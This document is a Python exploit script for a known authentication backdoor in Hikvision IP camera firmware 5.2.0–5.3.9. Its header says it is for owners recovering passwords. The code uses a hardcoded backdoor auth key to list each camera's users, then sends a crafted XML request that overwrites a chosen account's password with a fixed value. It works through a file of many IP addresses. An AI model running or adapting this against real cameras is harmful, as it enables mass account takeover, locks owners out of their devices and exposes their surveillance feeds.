#!/usr/bin/env python
# Exploit Title: Hikvision IP Camera versions 5.2.0 - 5.3.9 (Builds: 140721 - 170109) Backdoor
# Date: 15-03-2018
# Vendor Homepage: http://www.hikvision.com/en/
# Exploit Author: Matamorphosis
# Category: Web Apps
# Description: Exploits a backdoor in Hikvision camera firmware versions 5.2.0 - 5.3.9 (Builds: 140721 - 170109), deployed between 2014 and 2016, to assist the owner recover their password.
# Vulnerability Exploited: ICSA-17-124-01 - http://seclists.org/fulldisclosure/2017/Sep/23

import requests
import re
import sys
import time

# BASIC INFO
newPass = "@Dm1N1$Tr80R"  # Password compliant with firmware requirements
BackdoorAuthArg = "auth=YWRtaW46MTEK"  # Authentication key

def usage():
    print("[i] Usage: python exploit.py [Port] [SSL (Y/N)] [Path to IP list file]")

def read_ips_from_file(file_path):
    """Read IP addresses from a text file."""
    try:
        with open(file_path, 'r') as file:
            # Read lines, strip whitespace, and filter out empty lines
            ips = [line.strip() for line in file if line.strip()]
        return ips
    except FileNotFoundError:
        print(f"[-] Error: The file {file_path} was not found.")
        return []
    except Exception as e:
        print(f"[-] Error reading file {file_path}: {str(e)}")
        return []

def validate_ip(ip):
    """Validate IP address format."""
    ipmatch = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ip)
    return bool(ipmatch)

def process_camera(ip, port, protocol):
    """Process a single camera IP for the backdoor exploit."""
    print(f"\n[+] Processing IP: {ip}")

    if not validate_ip(ip):
        print(f"[-] The IP address {ip} is not in the correct format.")
        return

    URLBase = f"{protocol}://{ip}:{port}/"  # URL base for requests
    URLDownload = f"{URLBase}Security/users?{BackdoorAuthArg}"  # Download request

    print(f"[+] Getting User List for {ip}.")

    try:
        # Fetch user list
        DownloadResponse = requests.get(URLDownload, timeout=5).text

        userID = ""
        userName = ""

        # Parse response for user ID and username
        for line in DownloadResponse.splitlines():
            useridmatch = re.search(r"<id>(.*)</id>", line)
            usernamematch = re.search(r"<userName>(.*)</userName>", line)

            if useridmatch:
                userID = useridmatch.group(1)
                print(f"[+] User ID: {userID}")
            if usernamematch:
                userName = usernamematch.group(1)
                print(f"[+] Username: {userName}")

        if not userID or not userName:
            print(f"[-] No valid user ID or username found for {ip}.")
            return

        # Prompt for user ID and username (or automate with defaults if desired)
        userID_input = input(f"[?] Which User ID would you like to use for {ip}? (Default: {userID}) ") or userID
        userName_input = input(f"[?] Which Username would you like to use for {ip}? (Default: {userName}) ") or userName

        print(f"[+] Using the User {userName_input} for {ip}.")

        # Craft XML payload
        userXML = (
            f'<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n'
            f'<id>{userID_input}</id>\r\n'
            f'<userName>{userName_input}</userName>\r\n'
            f'<password>{newPass}</password>\r\n'
            f'</User>'
        )

        URLUpload = f"{URLBase}Security/users/{userID_input}?{BackdoorAuthArg}"  # Upload request

        print(f"[+] Changing Password for {ip} now.")

        # Send the payload to update the password
        response = requests.put(URLUpload, data=userXML, timeout=5)
        print(response.text)

        print(f"[+] Complete. Please try logging in to {ip} with these credentials. Username: {userName_input}, Password: {newPass}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection to {ip} failed! Error: {str(e)}")

def main():
    # Parse command-line arguments
    try:
        port = int(sys.argv[1])
        SSL = sys.argv[2].upper()
        file_path = sys.argv[3]
    except IndexError:
        print("[-] One or more of the arguments is missing.")
        usage()
        sys.exit(1)
    except ValueError:
        print(f"[-] The entered port {sys.argv[1]} is not a number.")
        usage()
        sys.exit(1)

    # Validate port
    if port <= 0 or port > 65535:
        print(f"[-] The entered port {port} is not a valid port number.")
        usage()
        sys.exit(1)

    # Set protocol based on SSL
    protocol = "https" if SSL == "Y" else "http"

    # Read IPs from file
    ip_list = read_ips_from_file(file_path)
    if not ip_list:
        print("[-] No IPs to process. Exiting.")
        sys.exit(1)

    print(f"[+] Found {len(ip_list)} IP(s) to process.")

    # Process each IP
    for ip in ip_list:
        process_camera(ip, port, protocol)
        time.sleep(1)  # Add delay to avoid overwhelming servers

if __name__ == "__main__":
    main()
